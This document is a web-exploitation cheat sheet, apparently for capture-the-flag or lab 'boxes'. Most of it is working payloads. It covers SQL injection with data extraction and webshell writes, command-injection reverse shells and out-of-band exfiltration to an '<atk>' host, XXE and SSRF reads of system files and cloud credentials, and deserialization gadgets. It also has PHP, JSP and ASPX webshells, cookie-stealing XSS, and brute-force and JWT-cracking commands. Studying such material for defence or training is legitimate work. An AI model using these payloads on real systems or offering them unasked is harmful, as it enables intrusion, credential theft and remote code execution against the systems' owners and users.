# 04 — Web Vulnerability Classes

A reference of exploitation classes you'll meet on web targets, with detection markers, working payloads, and bypass tricks. Keep this open in a browser tab during boxes.

---

## 1. SQL Injection (SQLi)

### 1.1 Detection markers
Try in every parameter, header, cookie, JSON field:
```
'           "           `           \           %27         %22
') ('       ")          /*          --          ;
1' OR '1'='1
1) OR (1=1
admin'-- -
admin' #
' OR 1=1-- -
" OR 1=1-- -
') OR ('1'='1
' UNION SELECT NULL-- -
1' AND SLEEP(5)-- -
1' AND IF(1=1,SLEEP(5),0)-- -
```

If the response changes (errors, layout, count), you have a candidate.

### 1.2 Auth bypass classics
```
Username: admin'-- -
Username: admin' #
Username: admin'/*
Username: ' OR 1=1-- -
Username: " OR 1=1-- -
Username: ' OR 'x'='x
```

### 1.3 Union-based exploitation
1. Determine column count: `1' ORDER BY 1-- -`, `2-- -`, ... until error.
2. Find a string-typed reflected column: `1' UNION SELECT NULL,'a',NULL-- -`.
3. Extract data:
```sql
1' UNION SELECT NULL,version(),NULL-- -
1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
1' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL FROM users-- -
```

### 1.4 Per-DB cheats

**MySQL / MariaDB**
```sql
SELECT @@version;
SELECT user();
SELECT database();
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php';
```

**PostgreSQL**
```sql
SELECT version();
SELECT current_user;
SELECT string_agg(table_name,',') FROM information_schema.tables;
-- Superuser RCE:
DROP TABLE IF EXISTS x; CREATE TABLE x(t TEXT);
COPY x FROM PROGRAM 'id';
SELECT * FROM x;
```

**MSSQL**
```sql
SELECT @@version;
SELECT name FROM sys.databases;
EXEC xp_cmdshell 'whoami';     -- if enabled / sysadmin
-- enable if disabled (sysadmin):
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
```

**SQLite**
```sql
SELECT sqlite_version();
SELECT name FROM sqlite_master WHERE type='table';
-- file write via ATTACH DATABASE in some configs
```

**Oracle**
```sql
SELECT banner FROM v$version;
SELECT table_name FROM all_tables;
```

### 1.5 Blind SQLi
**Boolean**:
```
1' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'-- -
```
**Time-based**:
```
1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -      -- MySQL
1'; WAITFOR DELAY '0:0:3'--                                  -- MSSQL
1'; SELECT pg_sleep(3)--                                     -- PostgreSQL
```

### 1.6 sqlmap
```bash
sqlmap -u "http://<host>/page?id=1" --batch --dbs --risk=2 --level=3
sqlmap -r request.txt --batch --tamper=between,space2comment
sqlmap -u "http://<host>/page?id=1" --os-shell           # if RCE possible
sqlmap -u "http://<host>/page?id=1" --file-read=/etc/passwd
sqlmap -u "http://<host>/page?id=1" --file-write=shell.php --file-dest=/var/www/html/sh.php
```

### 1.7 WAF bypasses (overview)
- Comments: `/**/`, `/*!50000UNION*/` (MySQL versioned)
- Case: `UnIoN SeLeCt`
- Encoding: URL-encode, double URL-encode
- Whitespace alternatives: `%09`, `%0a`, `+`, `/**/`
- Equivalent operators: `=` → `LIKE`, `!=` → `<>`
- `tamper` scripts in sqlmap are pre-made

---

## 2. NoSQL Injection

Mainly MongoDB.

### 2.1 Auth bypass (login bodies)
JSON body:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
```

URL form:
```
username[$ne]=&password[$ne]=
username=admin&password[$regex]=^a
```

### 2.2 Blind extraction
```
username=admin&password[$regex]=^a.*
username=admin&password[$regex]=^aa.*
...
```
Iterate character by character.

---

## 3. Command Injection

### 3.1 Detection
For any input that looks like it hits the OS (ping forms, DNS lookup, file conversion):
```
; id
| id
& id
&& id
|| id
`id`
$(id)
$(`id`)
\nid
%0a id
```

### 3.2 Filtered space
```
${IFS}
${IFS}$9
%09 (tab)
{cmd,arg}             # bash brace
<cmd,arg
```
Examples:
```
;cat${IFS}/etc/passwd
;{cat,/etc/passwd}
;cat$IFS$9/etc/passwd
```

### 3.3 Filtered slash
```
;cat /etc/passwd                # if "/" blocked, base64-encode
;`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
```

### 3.4 Blind / no output
**Time-based**:
```
;sleep 5
&&ping -c 5 127.0.0.1
```
**OOB exfil**:
```
;curl http://<atk>/$(id|base64)
;wget http://<atk>/`whoami`
;nslookup `whoami`.<atk>.dnsbin
```
Set up a listener (`nc -lnvp 80`) or DNS catcher (Burp Collaborator, interactsh).

### 3.5 Reverse shell from cmd injection
```
;bash -c 'bash -i >& /dev/tcp/<atk>/4444 0>&1'
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <atk> 4444 >/tmp/f
```
URL-encode for transport.

---

## 4. Local & Remote File Inclusion (LFI / RFI)

### 4.1 Detection
```
?file=../../../../etc/passwd
?file=....//....//etc/passwd       (filter bypass)
?file=..%2f..%2f..%2fetc%2fpasswd
?file=/etc/passwd                  (absolute)
?file=/etc/passwd%00               (legacy null byte)
?file=php://filter/convert.base64-encode/resource=index
```

Linux high-value reads:
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/maps
/proc/<pid>/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/mail/<user>
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/root/.ssh/id_rsa
```

Windows high-value reads:
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM      (locked normally)
C:\Windows\debug\NetSetup.log
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\Users\<user>\NTUSER.DAT
C:\inetpub\wwwroot\web.config
```

### 4.2 PHP wrappers
```
php://filter/convert.base64-encode/resource=index.php       # source disclosure
php://filter/zlib.deflate/convert.base64-encode/resource=...
php://input                                                 # POST body included
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id                                                 # if expect ext loaded
zip://shell.zip%23shell.php
phar://shell.phar/shell.php
```

### 4.3 LFI → RCE via log poisoning
1. Inject PHP into a log:
```
curl http://<host>/ -A "<?php system(\$_GET['c']); ?>"
```
2. Include the log:
```
?file=/var/log/apache2/access.log&c=id
```
Works on `error.log`, `auth.log` (via SSH login attempts), `mail.log`.

### 4.4 LFI → RCE via /proc/self/environ
Send `User-Agent: <?php system($_GET['c']); ?>`, then include `/proc/self/environ?c=id`.

### 4.5 LFI → RCE via session file
PHP sessions in `/var/lib/php/sessions/sess_<PHPSESSID>`. Set a session var to PHP code (often via reflected input), then include the session file.

### 4.6 RFI
Requires `allow_url_include=On` (rare modern). On hit:
```
?file=http://<atk>/shell.txt
```

---

## 5. Server-Side Template Injection (SSTI)

### 5.1 Detection
Render-time math markers:
```
{{7*7}}        Jinja2, Twig, Tornado
${7*7}         FreeMarker, Spring SpEL, Velocity
<%= 7*7 %>     ERB (Ruby)
#{7*7}         Ruby Slim, Pug
{{= 7*7 }}     Underscore
{7*7}          plain (unlikely)
```
If response shows `49`, you've got SSTI.

### 5.2 Engine identification
```
{{7*'7'}}    → 7777777   Jinja2
{{7*'7'}}    → 49         Twig
${7*'7'}     → 49         FreeMarker
${{7*7}}    → ${{7*7}}   Spring SpEL won't render (try ${T(...)})
```

### 5.3 Jinja2 RCE
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

{{ ''.__class__.__mro__[1].__subclasses__() }}      # find Popen index
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()[0] }}

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

{{ url_for.__globals__.os.popen('id').read() }}     # Flask
```

### 5.4 Twig RCE
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 5.5 FreeMarker RCE
```
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```

### 5.6 Velocity / Spring SpEL
```
T(java.lang.Runtime).getRuntime().exec("id")
```

### 5.7 Tools
- `tplmap` — automated SSTI scanner & RCE
- HackTricks template injection page for engine-specific bypasses

---

## 6. XML External Entity (XXE)

### 6.1 Classic
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><x>&xxe;</x></root>
```
If response includes the file content, you're in.

### 6.2 Where to inject
- SOAP / SAML payloads
- File uploads parsed as XML (DOCX, XLSX, SVG)
- API endpoints accepting XML
- RSS/Atom imports

### 6.3 PHP filter for binary files
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### 6.4 Blind XXE — out-of-band
Attacker hosts `evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<atk>/?x=%file;'>">
%eval;
%exfil;
```
Target XML:
```xml
<!DOCTYPE r [<!ENTITY % rem SYSTEM "http://<atk>/evil.dtd">%rem;]>
```

### 6.5 SVG XXE
SVG is XML; image upload + SVG → XXE pivot.
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

---

## 7. Server-Side Request Forgery (SSRF)

### 7.1 Detection
Anywhere a URL is fetched server-side (image proxy, webhook, PDF export, OAuth):
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://127.1
http://2130706433       (decimal 127.0.0.1)
http://0177.0.0.1       (octal)
```

### 7.2 Cloud metadata endpoints
```
http://169.254.169.254/latest/meta-data/                # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/     # GCP (needs Metadata-Flavor: Google header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  # Azure (needs Metadata: true)
```

### 7.3 Bypass filters
- DNS rebinding (custom domain that resolves first to public, then internal)
- Open redirect chain: `http://allowed.com/redirect?to=http://internal/`
- URL parsing differential: `http://expected@evil/`, `http://evil#@expected/`
- Different schemes: `gopher://`, `dict://`, `file://`, `ftp://`
- IPv6: `[::ffff:127.0.0.1]`

### 7.4 Gopher → arbitrary TCP
```
gopher://127.0.0.1:6379/_INFO%0d%0a
```
Exploits unauth Redis, MySQL, SMTP from within an SSRF.

---

## 8. Insecure Deserialization

### 8.1 Java
```bash
ysoserial CommonsCollections5 'curl http://<atk>/p' > payload.bin
# Send as: serialized cookie, viewstate, RMI, JMX, JBoss invoke endpoint, etc.
```
Indicators: `rO0AB` (base64) at start of any cookie/data = Java serialized.

### 8.2 PHP
Object inputs use `__wakeup`, `__destruct`, `__toString` magic.
```bash
phpggc Laravel/RCE5 system id      # generate gadget
phpggc Symfony/RCE1 system id
```
Look for `unserialize($_COOKIE['x'])` or similar in source. Check `.phar` upload + `phar://` stream.

### 8.3 .NET
```bash
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c whoami' -o base64
```
Indicators: `AAEAAAD/////` base64 ViewState; `__VIEWSTATE` with no MAC.

### 8.4 Python pickle
```python
import pickle, os, base64
class P:
    def __reduce__(self): return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(P())).decode())
```
Anywhere user input flows to `pickle.loads`, `cPickle.loads`, `yaml.load` (without `SafeLoader`), `marshal.loads`.

### 8.5 Node.js
Look for `node-serialize`. Payload:
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,s,t){console.log(s)})}()"}
```

---

## 9. File Upload → RCE

### 9.1 Common bypass strategies

**Extension blacklist (single):**
```
shell.php       blocked
shell.PHP       case bypass
shell.phP       case bypass
shell.php3 / php4 / php5 / php7 / phtml / phar / pht / inc
shell.phtml
```

**Extension blacklist (double):**
```
shell.php.jpg          (Apache mod_mime if .php handled middle)
shell.php%00.jpg       (legacy null byte)
shell.php;.jpg         (IIS 6 / 7 quirk)
shell.php/             (some routers)
shell.asp;.jpg         (IIS 6)
```

**Content-Type whitelist:**
- Edit `Content-Type:` header to `image/jpeg`.
- Add valid magic bytes: `GIF89a;` prefix to PHP file.

**Content sniff:**
- Embed PHP after image data:
```bash
exiftool -Comment='<?php system($_GET[c]); ?>' image.jpg
mv image.jpg image.php.jpg
```

**.htaccess upload:**
```
AddType application/x-httpd-php .jpg
```
Then upload `shell.jpg` containing PHP.

**Server side processing:**
- ImageMagick → ImageTragick (`CVE-2016-3714`)
- LibreOffice / Office macro doc → RCE

### 9.2 SVG upload
SVG is XML → XXE / XSS / SSRF entry point:
```xml
<?xml version="1.0"?>
<svg><script>alert(document.cookie)</script></svg>
```

### 9.3 Webshells

**PHP** — minimal one-liner:
```php
<?php system($_GET['c']); ?>
```

Better PHP shell (`p0wny-shell.php`, `wso.php`) for usability. Or use as a bridge to a real reverse shell.

**JSP**:
```jsp
<%@ page import="java.util.*,java.io.*" %>
<% Process p = Runtime.getRuntime().exec(request.getParameter("c")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>
```

**ASPX**:
```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>
```

---

## 10. Authentication & Session

### 10.1 Default credential check
Always try, before anything fancy:
```
admin:admin   admin:password   admin:admin123   admin:        :admin
root:root     root:toor        root:password    root:
guest:guest   user:user        test:test
```
Service-specific: `tomcat:tomcat`, `weblogic:welcome1`, `postgres:postgres`.

### 10.2 Username enumeration
- Login error differs ("user not found" vs "wrong password")
- Forgot-password reveals existence
- Response time differs
- 403 vs 401 distinction

### 10.3 Brute force
```bash
hydra -L users -P passes ssh://<ip> -t 4
hydra -l admin -P rockyou.txt http-post-form "<host>/login:user=^USER^&pass=^PASS^:F=Invalid" -t 8
hydra -L users -P passes -f -V <ip> http-get / -m "/admin"     # basic auth
```
ffuf for web logins (more flexible):
```bash
ffuf -w passes.txt -X POST -d 'user=admin&pass=FUZZ' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -u http://<host>/login -fr 'Invalid'
```

### 10.4 Password reset abuse
- **Token entropy**: collect 5–10 reset tokens; if predictable, forge.
- **Host header injection**: change `Host:` to attacker host → email link points to attacker, victim clicks.
- **Email param manipulation**: `email=victim@x&email=me@y` (HTTP parameter pollution).
- **Token reuse / no expiry**: capture once, reuse later.

### 10.5 JWT attacks
Decode at jwt.io (or `jwt-cli`).

**Algorithm "none":**
Change header `{"alg":"HS256"}` → `{"alg":"none"}`, drop signature. If accepted, you're in.

**Weak HS256 secret crack:**
```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

**RS256 → HS256 confusion:**
Re-sign with the public key as HMAC secret.

**`kid` injection / SQLi in `kid`:**
```json
{"alg":"HS256","kid":"../../../dev/null"}
```
Then sign with empty key.

### 10.6 Session fixation / hijacking
- Cookie set before login? Set victim's cookie, wait for them to log in, ride.
- Cookie not regenerated on privilege change? Capture pre-priv, use post-priv.

---

## 11. Cross-Site Scripting (XSS)

### 11.1 Detection markers
```
<script>alert(1)</script>
"><script>alert(1)</script>
';alert(1);//
javascript:alert(1)
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
```

### 11.2 Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### 11.3 Filter bypass
- Case: `<ScRiPt>`
- Encoding: `&#x3c;script&#x3e;`, `%3Cscript%3E`
- Mixed-encoding tricks for browsers
- Tag confusion: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- Event handlers without `<script>`: `onfocus`, `onmouseover`, `onerror`, `onload`, `oninvalid`

### 11.4 Useful payloads in lab/CTF context
- **Steal cookie**: `<script>fetch('http://<atk>/?c='+document.cookie)</script>`
- **Steal local storage**: `<script>fetch('http://<atk>/?ls='+JSON.stringify(localStorage))</script>`
- **Internal port scan**: `<img src='http://192.168.1.X:80'>`
- **Force admin action via stored XSS**: build a page that submits a form/JSON to an admin-only endpoint when admin views.

### 11.5 Where XSS hides
- Form fields, search params, URL fragments (`#`)
- HTTP headers reflected (Referer, User-Agent)
- Filenames in upload listings
- Error messages
- Profile / username fields
- Markdown / WYSIWYG editor previews
- PDF / chart-export endpoints (server-side rendering with headless browser)

---

## 12. CSRF

- Modern apps with `SameSite=Lax` defaults are largely protected.
- Look for state-changing GET endpoints (rare but devastating).
- Look for missing CSRF tokens on POST endpoints.
- Token validation that accepts any non-empty value? Bypass.
- Token validated only when present? Bypass by removing the header entirely.

---

## 13. CORS Misconfiguration

```
Access-Control-Allow-Origin: <reflects Origin>
Access-Control-Allow-Credentials: true
```
If both, an attacker site can read authenticated responses. Confirm:
```bash
curl -H "Origin: http://evil" -i http://<host>/api/me
```

Also dangerous:
- `Access-Control-Allow-Origin: null` with `Allow-Credentials: true` (sandboxed iframe = origin null).
- Suffix matching that lets `evil.com.victim.com` through.

---

## 14. Open Redirects

```
?next=http://attacker
?redirect=//attacker
?url=http://attacker
?return=http%3a%2f%2fattacker
```
Useful as a building block: SSRF gating, OAuth redirect_uri abuse, phishing.

---

## 15. HTTP Request Smuggling (CL.TE / TE.CL)

Higher-skill bug. Diagnose with Burp's Smuggler extension. Outline:
- Front-end uses Content-Length, back-end uses Transfer-Encoding (or vice versa)
- Smuggle a second request that bypasses front-end controls

Worth mentioning; rarely the answer on Easy boxes.

---

## 16. Cache Poisoning

If a header is reflected in a cacheable response and varies by something the cache key ignores, you can poison.
- Test header: `X-Forwarded-Host: evil.com`
- Look for that host in response (`Location`, link tags, JSON)
- Confirm the response is cached

---

## 17. WebSocket Vulnerabilities

- **Lack of origin check** → cross-site WebSocket hijacking
- **Auth on connect, not on message** → spoof messages once connected
- **Injection in message content** → SQLi, XSS, etc., in WS-handled commands

---

## 18. Tool Reference (per class)

| Class | Best tools |
|-------|-----------|
| SQLi | sqlmap, Burp Repeater, ghauri |
| Command Injection | Burp, custom payloads, commix |
| LFI | LFISuite, fimap, manual + ffuf |
| SSTI | tplmap, Burp |
| XXE | Burp Pro Scanner, manual |
| SSRF | Burp Collaborator, interactsh, custom |
| Deserialization | ysoserial, ysoserial.net, phpggc |
| File upload | Burp, manual, fuzzer for extensions |
| JWT | jwt_tool, jwt-cli, hashcat |
| XSS | XSS Hunter Express, Burp, manual |
| CSRF | Burp PoC generator |
| Open redirect | manual |
| Race conditions | Turbo Intruder (Burp ext) |

---

## 19. The Unified "Try Everything" Marker Set

Paste any of these, in any field, and watch for anomalies:
```
'
"
<x>
${{7*7}}
{{7*7}}
;id
%0aid
$(id)
../../etc/passwd
http://attacker/x
{"$ne":null}
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Anomaly = lead.

---

*Vulns hide where data crosses a trust boundary. Every input. Every header. Every cookie. Test all of them.*
